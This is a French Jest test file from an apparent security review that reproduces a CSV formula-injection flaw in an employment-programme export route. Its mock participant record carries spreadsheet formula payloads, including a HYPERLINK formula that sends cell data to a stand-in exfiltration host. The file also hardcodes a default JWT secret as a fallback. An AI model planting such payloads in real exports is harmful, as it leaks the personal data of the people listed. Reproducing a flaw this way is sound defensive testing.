// ═══════════════════════════════════════════════════════════════════════════
// REVUE DE SÉCURITÉ PR A — C-03 : injection de formule dans les exports CSV.
//
// `esc()` (routes/exports-fse.js l.76 ; routes/exports.js l.451) ne met entre
// guillemets que les cellules contenant « ; », « " » ou un saut de ligne. Une
// cellule qui COMMENCE par =, +, -, @, TAB ou CR est donc écrite telle quelle,
// et Excel / LibreOffice / Google Sheets l'interprètent comme une FORMULE à
// l'ouverture du fichier chez l'agent de la DDETS.
//
// Le contenu de ces cellules vient de champs libres saisis ou importés
// (`employees.city`, `first_name`, `last_name`, `insertion_projets.nom`).
// Test de REPRODUCTION : vert tant que le défaut est là.
// ═══════════════════════════════════════════════════════════════════════════
const jwt = require('jsonwebtoken');

const JWT_SECRET = process.env.JWT_SECRET || 'change-this-in-production';
process.env.JWT_SECRET = JWT_SECRET;

const mockQuery = jest.fn();
jest.mock('../../src/config/database', () => ({
  query: (...a) => mockQuery(...a),
  connect: async () => ({ query: (...a) => mockQuery(...a), release: () => {} }),
}));
jest.mock('../../src/middleware/activity-logger', () => ({
  autoLogActivity: () => (req, res, next) => next(),
  logActivity: () => {},
}));

const express = require('express');
const request = require('supertest');

let appExports;
const token = jwt.sign(
  { id: 1, username: 'rh.test', role: 'RH', first_name: 'T', last_name: 'U', mfa: true, mfa_at: Math.floor(Date.now() / 1000) },
  JWT_SECRET, { expiresIn: '1h' }
);

beforeAll(() => {
  appExports = express();
  appExports.use(express.json());
  appExports.use('/api/exports', require('../../src/routes/exports-fse'));
});

const PROJET = {
  id: 1, code: 'ASI-2026-2027', nom: 'Accompagnement Social Intensif 2026-2027',
  type: 'asi', financeur: 'FSE+', date_debut: '2026-01-01', date_fin: '2027-12-31',
  convention_ref: null, taux_forfaitaire_pct: null, cofinancement_ue_pct: 60, actif: true,
};

// Charge utile : une commune et un nom tels qu'un import de paie pourrait les
// porter. Aucun ne contient « ; » ni guillemet → `esc()` les laisse nus.
const PARTICIPANT_PIEGE = {
  employee_id: 5, date_entree: '2026-01-01', date_sortie: null, id: 5,
  first_name: '=1+1', last_name: '@SUM(A1:A9)',
  birth_date: '1988-04-12', gender: 'M',
  city: '=HYPERLINK("http://exfiltration.example/?d="&A2&B2,"Cliquez ici")',
  insertion_start_date: '2025-07-15', contract_end: '2026-08-21',
  brsa: true, ft_categorie: 'F', referent_unique_type: 'cms', parcours_num: 1,
  premier_cddi: '2025-07-15', fse_entree: {}, fse_entree_saisie_at: null, niveau_formation: null,
  fse_date_sortie: null, situation_sortie: null, saisie_at: null,
  situation_6mois: null, date_releve_6mois: null, criteres: 'brsa, deld',
};

beforeEach(() => {
  mockQuery.mockReset();
  mockQuery.mockImplementation((sql) => {
    const s = String(sql);
    if (/FROM insertion_projets WHERE id/.test(s)) return Promise.resolve({ rows: [PROJET] });
    if (/FROM insertion_projets WHERE actif/.test(s)) return Promise.resolve({ rows: [PROJET] });
    if (/FROM insertion_projet_participants pp\s+JOIN employees/.test(s)) return Promise.resolve({ rows: [PARTICIPANT_PIEGE] });
    if (/FROM employees e WHERE e\.id = ANY/.test(s)) return Promise.resolve({ rows: [{ ...PARTICIPANT_PIEGE, insertion_status: 'en_parcours' }] });
    return Promise.resolve({ rows: [] });
  });
});

describe('C-03 — injection de formule dans l’export FSE+ participants', () => {
  test('DÉFAUT — une cellule commençant par « = », « @ » ou « + » part NON neutralisée', async () => {
    const res = await request(appExports)
      .get('/api/exports/fse-plus?projet=1&annee=2026&trimestre=1')
      .set('Authorization', `Bearer ${token}`);
    expect(res.status).toBe(200);

    const lignes = res.text.replace(/^﻿/, '').split('\n').filter((l) => l && !l.startsWith('#'));
    const ligneDonnee = lignes[1]; // [0] = en-tête des 29 colonnes
    const cellules = ligneDonnee.split(';');

    // Colonnes 2 et 3 (NOM, Prénom) et 6 (Commune) — indices 1, 2 et 5.
    expect(cellules[1]).toBe('@SUM(A1:A9)');      // non préfixé, non quoté
    expect(cellules[2]).toBe('=1+1');             // idem
    // La commune contient un guillemet : `esc()` la met entre guillemets — mais
    // le guillemetage est une convention CSV, pas une neutralisation de formule :
    // le tableur DÉGUILLEMETTE puis évalue. Le contenu réel commence bien par « = ».
    const commune = cellules[5].replace(/^"|"$/g, '').replace(/""/g, '"');
    expect(commune.startsWith('=HYPERLINK(')).toBe(true);

    // Ce qu'une neutralisation produirait (préfixe apostrophe ou quote forcée) :
    expect(cellules[2].startsWith("'")).toBe(false);
    expect(cellules[2].startsWith('"')).toBe(false);
  });

  test('référence — une cellule contenant « ; » est bien quotée (le seul cas traité)', async () => {
    const res = await request(appExports)
      .get('/api/exports/fse-plus?projet=1')
      .set('Authorization', `Bearer ${token}`);
    // La ligne « # Périmètre;… » prouve que le séparateur est bien « ; ».
    expect(res.text).toContain('# Périmètre;');
  });
});
